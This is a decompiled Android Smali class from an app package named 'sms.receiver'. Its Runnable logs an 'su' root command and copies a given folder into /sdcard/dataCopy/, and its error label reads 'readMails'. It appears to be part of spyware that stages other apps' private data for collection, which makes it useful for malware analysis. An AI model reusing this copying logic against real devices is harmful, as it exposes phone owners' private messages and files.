.class Lcom/binary/sms/receiver/SkeletonActivity$6;
.super Ljava/lang/Object;
.source "SkeletonActivity.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/binary/sms/receiver/SkeletonActivity;->copy4(Ljava/lang/String;J)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/binary/sms/receiver/SkeletonActivity;

.field private final synthetic val$source:Ljava/lang/String;


# direct methods
.method constructor <init>(Lcom/binary/sms/receiver/SkeletonActivity;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lcom/binary/sms/receiver/SkeletonActivity$6;->this$0:Lcom/binary/sms/receiver/SkeletonActivity;

    iput-object p2, p0, Lcom/binary/sms/receiver/SkeletonActivity$6;->val$source:Ljava/lang/String;

    .line 400
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 8

    .prologue
    .line 404
    :try_start_0
    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "copy4 root folder: "

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v5, p0, Lcom/binary/sms/receiver/SkeletonActivity$6;->val$source:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 405
    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "suCommand: "

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v5, Lcom/binary/sms/receiver/SkeletonActivity;->suCommand:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 406
    new-instance v2, Ljava/io/File;

    iget-object v4, p0, Lcom/binary/sms/receiver/SkeletonActivity$6;->val$source:Ljava/lang/String;

    invoke-direct {v2, v4}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 407
    .local v2, "f":Ljava/io/File;
    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v4

    if-nez v4, :cond_1

    .line 408
    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "file not exist: "

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 412
    :goto_0
    iget-object v4, p0, Lcom/binary/sms/receiver/SkeletonActivity$6;->this$0:Lcom/binary/sms/receiver/SkeletonActivity;

    const/4 v5, 0x0

    invoke-static {v4, v5}, Lcom/binary/sms/receiver/SkeletonActivity;->access$1(Lcom/binary/sms/receiver/SkeletonActivity;I)V

    .line 415
    iget-object v4, p0, Lcom/binary/sms/receiver/SkeletonActivity$6;->this$0:Lcom/binary/sms/receiver/SkeletonActivity;

    invoke-static {v4, v2}, Lcom/binary/sms/receiver/SkeletonActivity;->access$2(Lcom/binary/sms/receiver/SkeletonActivity;Ljava/io/File;)V

    .line 417
    const-string v0, "/sdcard/"

    .line 418
    .local v0, "destBaseFolder":Ljava/lang/String;
    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v4

    invoke-virtual {v4}, Ljava/io/File;->exists()Z

    move-result v4

    if-eqz v4, :cond_2

    .line 420
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v5

    invoke-virtual {v5}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v5, "/dataCopy/"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 427
    :goto_1
    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "destBaseFolder: "

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 429
    new-instance v3, Ljava/io/File;

    invoke-direct {v3, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 430
    .local v3, "folder":Ljava/io/File;
    invoke-virtual {v3}, Ljava/io/File;->exists()Z

    move-result v4

    if-nez v4, :cond_0

    .line 432
    invoke-virtual {v3}, Ljava/io/File;->mkdirs()Z

    .line 435
    :cond_0
    new-instance v4, Ljava/io/File;

    iget-object v5, p0, Lcom/binary/sms/receiver/SkeletonActivity$6;->val$source:Ljava/lang/String;

    invoke-direct {v4, v5}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    new-instance v5, Ljava/io/File;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v7, p0, Lcom/binary/sms/receiver/SkeletonActivity$6;->val$source:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-static {}, Lcom/binary/sms/receiver/SkeletonActivity;->access$3()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-static {v4, v5}, Lcom/binary/sms/receiver/SystemUtils;->copyFiles(Ljava/io/File;Ljava/io/File;)V

    .line 451
    .end local v0    # "destBaseFolder":Ljava/lang/String;
    .end local v2    # "f":Ljava/io/File;
    .end local v3    # "folder":Ljava/io/File;
    :goto_2
    return-void

    .line 410
    .restart local v2    # "f":Ljava/io/File;
    :cond_1
    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "File exist: "

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_0

    .line 448
    .end local v2    # "f":Ljava/io/File;
    :catch_0
    move-exception v1

    .line 449
    .local v1, "e":Ljava/lang/Exception;
    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "readMails: "

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4, v1}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_2

    .line 424
    .end local v1    # "e":Ljava/lang/Exception;
    .restart local v0    # "destBaseFolder":Ljava/lang/String;
    .restart local v2    # "f":Ljava/io/File;
    :cond_2
    :try_start_1
    const-string v0, "/sdcard/dataCopy/"
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_1
.end method
